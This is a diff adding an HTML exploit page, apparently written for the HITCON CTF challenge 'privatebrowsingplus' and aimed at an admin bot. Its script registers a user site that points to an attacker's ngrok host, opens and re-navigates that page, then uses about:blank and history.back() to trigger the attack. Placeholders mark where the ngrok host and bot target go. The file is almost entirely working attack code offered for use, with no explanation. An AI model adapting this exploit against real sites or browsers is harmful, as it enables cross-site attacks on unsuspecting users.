@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>yes</title>
+</head>
+<body>
+
+<button onclick="main()">go</button>
+
+<script>
+	
+const sleep = d => new Promise(r => setTimeout(r, d));
+
+<FOR ADMIN BOT SWAP BELOW>
+// const REMOTE = "http://web:3000";
+const REMOTE = "https://privatebrowsingplus.chal.hitconctf.com";
+
+
+const main = async () => {
+	// ~avlonkadojoijrwiriririririiqwqw is registered to ngrok.
+	open(`${REMOTE}/create?name=avlonkadojoijrwiriririririiqwqw&site=${<YOUR NGROK HOST>}`);
+
+	await sleep(1000);
+
+	let w = open(`${REMOTE}/~avlonkadojoijrwiriririririiqwqw/page.html`);
+
+	await sleep(1000);
+
+	w.location = `${REMOTE}/~avlonkadojoijrwiriririririiqwqw/page.html#x`;
+
+	await sleep(1000);
+
+	w.location = "about:blank";
+
+	await sleep(300);
+
+	w.history.back();
+};
+
+main();
+
+</script>
+
+<!-- to keep network from being idle -->
+
+<img src="/wait/foo/100000">
+
+<img src="/wait/foo/100000">
+
+</body>
+</html>
